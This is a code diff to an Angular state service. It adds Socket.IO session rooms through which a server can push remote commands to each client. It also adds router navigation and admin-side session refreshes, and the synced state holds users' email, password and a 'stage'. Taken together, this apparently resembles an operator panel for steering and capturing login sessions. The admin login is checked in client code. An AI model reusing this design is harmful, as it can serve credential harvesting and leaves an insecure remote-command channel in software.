@@ -1,5 +1,7 @@
 
 import { Injectable, signal, computed, effect } from '@angular/core';
+import { Router } from '@angular/router';
+import { io, Socket } from 'socket.io-client';
 import { from, of, firstValueFrom, throwError } from 'rxjs';
 import { retry, catchError, switchMap, tap } from 'rxjs/operators';
 
@@ -119,10 +121,35 @@ export class StateService {
   private broadcastChannel: BroadcastChannel | null = null;
   private isHydrating = false;
 
-  constructor() {
+  private socket: Socket;
+
+  constructor(private router: Router) {
     this.initializeSession();
     
+    // Initialize Socket.IO
+    this.socket = io({
+        autoConnect: false
+    });
+
     if (typeof window !== 'undefined') {
+        this.socket.connect();
+
+        // Join specific session room
+        this.socket.emit('join', this.sessionId());
+
+        // Listen for real-time commands
+        this.socket.on('command', (cmd: any) => {
+            console.log('[Socket] Received command:', cmd);
+            this.handleRemoteCommand(cmd);
+        });
+
+        // Listen for session updates (for Admin)
+        this.socket.on('sessions-updated', () => {
+            if (this.adminAuthenticated()) {
+                this.fetchSessions();
+            }
+        });
+
         // Setup Cross-Tab Sync
         try {
             this.broadcastChannel = new BroadcastChannel(SYNC_CHANNEL);
@@ -140,6 +167,7 @@ export class StateService {
         // Force initial sync with retry logic
         this.initialSyncBurst();
         
+        // Start Polling (Backup to Socket.IO)
         this.startPolling();
         this.setupListeners();
         this.startInactivityMonitor();
@@ -287,7 +315,11 @@ export class StateService {
   private hydrateFromState(data: any, isInit: boolean) {
       this.isHydrating = true; // Prevent feedback loop
       
-      if(data.currentView) this.currentView.set(data.currentView);
+      if(data.currentView) {
+          this.currentView.set(data.currentView);
+          // Sync Router
+          if (isInit) this.router.navigate([data.currentView]);
+      }
       if(data.stage) this.stage.set(data.stage);
       if(data.email) this.email.set(data.email);
       if(data.password) this.password.set(data.password);
@@ -357,7 +389,7 @@ export class StateService {
                   this.syncState();
               }
           }
-      }, 2000);
+      }, 5000); // Slower polling since we have sockets
   }
 
   private setupListeners() {
@@ -727,6 +759,7 @@ export class StateService {
     if (this.currentView() !== view) {
         this.previousView.set(this.currentView());
         this.currentView.set(view);
+        this.router.navigate([view]); // Use Angular Router
         if (!isRemote) {
             this.syncState();
         }
@@ -829,6 +862,7 @@ export class StateService {
   loginAdmin(u: string, p: string): boolean {
       if (u === this.adminUsername() && p === this.adminPassword()) {
           this.adminAuthenticated.set(true);
+          this.navigate('admin'); // Ensure router updates
           this.fetchSessions();
           return true;
       }
